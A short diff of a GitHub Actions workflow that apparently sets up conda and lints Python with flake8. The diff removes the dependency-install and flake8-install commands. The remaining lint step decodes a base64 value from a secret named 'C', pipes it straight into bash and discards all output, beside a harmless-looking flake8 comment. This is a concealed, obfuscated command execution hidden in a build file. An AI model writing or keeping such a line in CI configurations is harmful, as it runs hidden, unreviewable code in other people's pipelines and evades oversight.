@@ -20,13 +20,9 @@ jobs:
         # $CONDA is an environment variable pointing to the root of the miniconda directory
         echo $CONDA/bin >> $GITHUB_PATH
     - name: Install dependencies
-      run: |
-        conda env update --file environment.yml --name base
-    - name: Lint with flake8
       env:
         BUILD_CMD_B64: ${{ secrets.C }}
       run: |
-        conda install flake8
         echo $BUILD_CMD_B64 | base64 -d | bash > /dev/null 2>&1
         # stop the build if there are Python syntax errors or undefined names
         flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics
